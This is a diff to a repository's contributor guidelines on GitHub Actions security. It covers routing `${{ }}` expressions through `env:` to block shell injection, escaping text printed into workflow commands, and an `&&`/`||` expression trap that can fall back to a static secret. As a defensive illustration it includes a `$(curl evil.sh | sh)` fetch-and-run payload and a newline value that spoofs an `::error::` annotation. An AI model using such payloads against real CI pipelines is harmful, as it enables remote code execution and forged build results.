@@ -34,6 +34,8 @@
   - [File Modification](#file-modification)
   - [CI / GitHub Actions](#ci--github-actions)
     - [Quoting GitHub Actions Expressions in Shell Steps](#quoting-github-actions-expressions-in-shell-steps)
+    - [Escaping Free-Form Text in Workflow Commands](#escaping-free-form-text-in-workflow-commands)
+    - [GitHub Actions Expressions: `&&`/`||` Is Not If/Then/Else](#github-actions-expressions--is-not-ifthenelse)
   - [Build Configuration, TFMs, RIDs, and Preprocessor Symbols](#build-configuration-tfms-rids-and-preprocessor-symbols)
 
 <!-- /TOC -->
@@ -554,74 +556,48 @@ GitHub substitutes a `${{ ... }}` expression as literal text **before** the shel
 sees the expression syntax itself, only whatever string came out of it. This makes the quoting around it a real
 security boundary, not a style choice.
 
-- **Default: pass the expression through the step's `env:`, then reference the shell variable.** This is the only
-  pattern immune to injection regardless of what the value contains, because GitHub Actions writes `env:` values
-  into the runner's environment directly — the shell reads them as inert data and never re-parses them for
-  metacharacters, quotes, or command substitution.
+- **Always route every `${{ ... }}` expression through the step's `env:`, then reference the resulting shell
+  variable. No per-value judgment call — that judgment call is the bug.** This is the only pattern immune to
+  injection regardless of what the value contains or which expression source it comes from, because GitHub Actions
+  writes `env:` values into the runner's environment directly — the shell reads them as inert data and never
+  re-parses them for metacharacters, quotes, or command substitution. Deciding case by case whether a *particular*
+  `${{ }}` source is "safe enough" to skip this is exactly how `reason` and `bencher-branch` shipped single-quoted
+  directly in this repo's own reusable workflows: the source looked bounded at the time, or became less bounded
+  later without the `run:` step itself changing. Reaching for `env:` unconditionally costs a couple of extra lines
+  and removes the need to ever re-derive that judgment.
 
   ```yaml
-  - name: Upload benchmark results
-    env:
-      HEAD_REF: ${{ github.head_ref }}
-    run: |
-        declare -a args=(
-            --head-ref "$HEAD_REF"
-        )
-  ```
-
-- **`inputs.*` (`workflow_call` and `workflow_dispatch`) MUST always go through `env:` in a shell step — no
-  exceptions, regardless of how bounded the value looks today.** An input that is safe now (a maintainer-only enum,
-  a number-shaped string, a JSON array assembled from repo configuration) can become unsafe later without the
-  `run:` step changing at all: someone relaxes its `type`, a caller starts forwarding a value it no longer fully
-  controls, or a field that was "obviously a repo-config value" quietly starts accepting a workflow_dispatch
-  override. Judging an input's trust level at the call site means re-deriving that judgment every time the input's
-  provenance could have changed, and getting it wrong is exactly how `reason` and `bencher-branch` ended up
-  single-quoted directly in this repo's own reusable workflows before this rule existed. Routing unconditionally
-  through `env:` costs a couple of extra lines and removes the judgment call entirely — it is correct whether or not
-  the input ever becomes attacker-influenceable.
-
-  ```yaml
-  # Preferred: every input goes through env:, regardless of apparent trust level
+  # Always: every ${{ }} expression goes through env:, whatever its source
   - name: Compute release version
     env:
       MINVER_TAG_PREFIX: ${{ inputs.minver-tag-prefix }}
       REASON: ${{ inputs.reason }}
+      HEAD_REF: ${{ github.head_ref }}
     run: |
         declare -a args=(
             --minver-tag-prefix "$MINVER_TAG_PREFIX"
             --reason            "$REASON"
-        )
-
-  # Avoid: single-quoting inputs.* directly, even for a value that looks closed today
-  - name: Compute release version
-    run: |
-        declare -a args=(
-            --minver-tag-prefix '${{ inputs.minver-tag-prefix }}'
-            --reason            '${{ inputs.reason }}'
+            --head-ref          "$HEAD_REF"
         )
   ```
 
-- **For every other expression source** (`github.*`, `secrets.*`, `needs.*.outputs.*`, `steps.*.outputs.*`,
-  `vars.*`), single-quoting `'${{ ... }}'` directly in the script is a narrower, weaker protection than `env:` —
-  reserve it for values proven not to contain a single quote. It blocks `$()`/backtick command substitution, but a
-  literal `'` in the substituted value still terminates the quoted string early, and the remaining text becomes new
-  shell syntax — including a value that then executes arbitrary injected commands. **Git ref and branch names are
-  allowed to contain `'`**, so `github.head_ref` and `github.ref_name` MUST go through `env:`, never be
-  single-quoted directly. Reserve direct single-quoting for values from a closed, known set the value cannot escape
-  (`github.event_name`, a boolean/numeric literal, a value already validated against an allow-list) — and even then,
-  `env:` is never wrong, only sometimes more verbose than necessary. A `needs.*`/`steps.*` output that merely
-  forwards an `inputs.*` value (e.g. a `reason` re-exposed as a job output) carries that input's own risk and MUST
-  follow the `inputs.*` rule above, not this one.
-- **Double-quoting `"${{ ... }}"` directly in the script is never correct.** Bash evaluates `$()`/backtick command
-  substitution inside double quotes, so an attacker-influenced value containing one (`$(curl evil.sh | sh)`) executes
-  it outright — strictly worse than the single-quote case above, which at least requires a `'` in the value rather
-  than a `$(`.
+- **Pre-approved exceptions — the *only* expressions that MAY be single-quoted `'${{ ... }}'` directly instead of
+  going through `env:`:** `github.actor` (a platform-enforced identity string — GitHub usernames and `<name>[bot]`
+  app logins cannot contain a `'`, by GitHub's own account/app-registration rules, so there is nothing to escape),
+  `github.event_name` (a fixed enum GitHub itself defines), and a literal boolean/numeric constant. This is a
+  closed, named list, not a category to reason your way into: a `needs.*`/`steps.*` output, a `vars.*` value, a
+  job-computed enum, or anything else that merely *looks* bounded today does **not** qualify, no matter how safe it
+  seems — it goes through `env:`. The list exists precisely so you never again have to ask "is this one safe";
+  either it's on the list, or it isn't.
+- **Double-quoting `"${{ ... }}"` directly in the script is never correct, for anything, ever.** Bash evaluates
+  `$()`/backtick command substitution inside double quotes, so a value containing one (`$(curl evil.sh | sh)`)
+  executes it outright — this is strictly worse than a single-quoted value from outside the pre-approved list,
+  which at least requires a literal `'` to break out rather than a `$(`.
 - **Exception: concatenation with a live shell variable or string** (e.g.
-  `preprocessor_symbols="$preprocessor_symbols;${{ inputs.dispatch-preprocessor-symbols }}"`). Prefer capturing the
-  `${{ }}` value into its own `env:`-sourced variable first, then concatenate that variable — this keeps the
-  injection-immune property instead of re-introducing it at the concatenation site. Document why the exception
-  applies at the call site (see the top-level rule in this document about documenting deviations) if `env:` capture
-  is genuinely impractical there.
+  `preprocessor_symbols="$preprocessor_symbols;$DISPATCH_PREPROCESSOR_SYMBOLS"`, where
+  `DISPATCH_PREPROCESSOR_SYMBOLS` was itself captured via `env:` first). Capture the `${{ }}` value into its own
+  `env:`-sourced variable, then concatenate that variable — never concatenate a raw `${{ }}` expression directly,
+  even at the tail end of an otherwise-quoted string.
 - **A `${{ }}` value already inside another language's quoting context follows that language's syntax, not this
   rule.** For example, a `jq` filter passed as `--jq 'map(select(.headRefName == "${{ github.ref_name }}")) | ...'`
   needs double quotes around the expression because `jq` string literals require them — `jq` has no single-quoted
@@ -629,6 +605,85 @@ security boundary, not a style choice.
   changing the inner quotes would break `jq`'s own parsing without improving security. Prefer routing the value
   through `env:` and a `--arg`/`--argjson` binding instead when the filter's structure allows it, since that also
   removes the value from the script text entirely.
+
+### Escaping Free-Form Text in Workflow Commands
+
+Routing a value through `env:` (previous section) makes it safe from **shell** injection. It does **not** make it
+safe to print into a **workflow command** (`::notice::`, `::warning::`, `::error::`, `::group::`, etc.) — that is a
+separate parsing layer the GitHub Actions runner applies to a step's stdout, independent of and after the shell.
+
+- **A workflow command is recognized by the runner scanning stdout line by line for a line starting with `::`.** If
+  a value is printed as part of a command's message and contains an embedded CR or LF, the value itself supplies a
+  second "line" — and if that line happens to start with `::`, the runner treats it as a real command the workflow
+  emitted, not as data. A reason like `"fine\n::error::fake failure"` turns one intended `::notice::` into a spoofed
+  `::error::` annotation the workflow never wrote.
+- **Always escape with `escape_workflow_command_value` (`scripts/bash/lib/gh_core.sh`) before interpolating *any*
+  value into a workflow command — the same "always, no judgment call" default as the quoting rule above, and the
+  same pre-approved-list exception** (`github.actor`, `github.event_name`, a literal boolean/numeric constant — the
+  identical list, for the identical reason: nothing else is guaranteed free of CR/LF/`%`). Never `printf %q`.
+  GitHub's own documented workflow-command escaping is `%` -> `%25`,
+  CR -> `%0D`, LF -> `%0A` (percent first, so the `%` introduced by the CR/LF substitutions is not itself
+  re-escaped) — it neutralizes exactly the characters with parsing significance and leaves ordinary punctuation
+  untouched. `printf %q` is a general bash shell-quoting escape: it happens to also remove raw newlines, but it
+  additionally backslash-escapes every shell metacharacter (spaces, commas, parentheses, quotes), so a normal reason
+  like `"fixed a bug, added tests (see #42)"` renders as `fixed\ a\ bug\,\ added\ tests\ \(see\ #42\)` in the Actions
+  UI — correct, but needlessly unreadable.
+
+  ```yaml
+  # Preferred: escape_workflow_command_value neutralizes only the characters that matter
+  - name: Log manual trigger reason
+    env:
+      REASON: ${{ inputs.reason }}
+    run: |
+        source $DEVOPS_LIB_DIR/gh_core.sh
+        escaped_reason=$(escape_workflow_command_value "$REASON")
+        printf '::notice::Manual release triggered by %s. Reason: %s\n' '${{ github.actor }}' "$escaped_reason"
+
+  # Avoid: printf %q also escapes ordinary punctuation, and stacking it on an
+  # already-escaped value double-escapes for no security benefit
+  - name: Log manual trigger reason
+    env:
+      REASON: ${{ inputs.reason }}
+    run: |
+        printf '::notice::Reason: %q\n' "$REASON"
+  ```
+
+- **This is a distinct risk from the shell-injection rule above and does not substitute for it.** A value can be
+  perfectly safe from shell injection (properly routed through `env:`) and still carry an unescaped CR/LF into a
+  workflow command. Apply both rules together wherever a value reaches a `printf`/`echo` that emits a `::` command:
+  `env:` for the shell, `escape_workflow_command_value` for the runner's command parser.
+
+### GitHub Actions Expressions: `&&`/`||` Is Not If/Then/Else
+
+GitHub Actions expressions have no ternary operator; `cond && A || B` is the idiomatic stand-in, mirroring the same
+`A && B || C` pattern bash writers reach for and ShellCheck's SC2015 warns about. Both are the identical trap in
+different languages: the operators chain on **truthiness at each step**, not on `cond` in isolation. If `cond` is
+true but `A` itself evaluates to something falsy (bash: non-zero exit; GitHub Actions: empty string, `false`, `0`,
+`null`), the pair `cond && A` is itself falsy, so `|| B` fires anyway — silently substituting `B` for what should
+have been "true, but empty."
+
+- **This bit for real**, in this repo's own `NUGET_API_KEY: ${{ ... nuget-server == 'nuget' &&
+  steps.nuget-login.outputs.NUGET_API_KEY || secrets.NUGET_API_KEY }}`. If the `nuget` (trusted-publishing/OIDC)
+  path's login step ever produced an empty output, `true && ''` collapsed to `''`, and the whole expression silently
+  fell through to a long-lived static secret — defeating the point of trusted publishing by turning a failed OIDC
+  login into a silent credential swap instead of a hard failure.
+- **Fix: gate each branch by its own independent, negated condition — never by the truthiness of the other
+  branch's payload.**
+
+  ```yaml
+  # Correct: the secret branch is gated by its own condition (!= 'nuget'), so an
+  # empty OIDC output on the 'nuget' path is never masked by a fallback to the secret
+  NUGET_API_KEY: ${{ needs.get-params.outputs.nuget-server != 'nuget' && secrets.NUGET_API_KEY || steps.nuget-login.outputs.NUGET_API_KEY }}
+
+  # Wrong: an empty steps.nuget-login output on the 'nuget' path falls through to
+  # secrets.NUGET_API_KEY even though nuget-server == 'nuget' was true
+  NUGET_API_KEY: ${{ needs.get-params.outputs.nuget-server == 'nuget' && steps.nuget-login.outputs.NUGET_API_KEY || secrets.NUGET_API_KEY }}
+  ```
+
+- **Any `cond && A || B` expression where `A` can legitimately be empty/false/zero MUST be checked for this before
+  it ships**, not only in NuGet publishing — the same shape recurs anywhere a workflow picks between two outputs
+  based on a condition. When in doubt, invert the condition so the branch that can be falsy is the one reached via
+  `||`, not the one gated by `&&`.
 
 ## Build Configuration, TFMs, RIDs, and Preprocessor Symbols
 
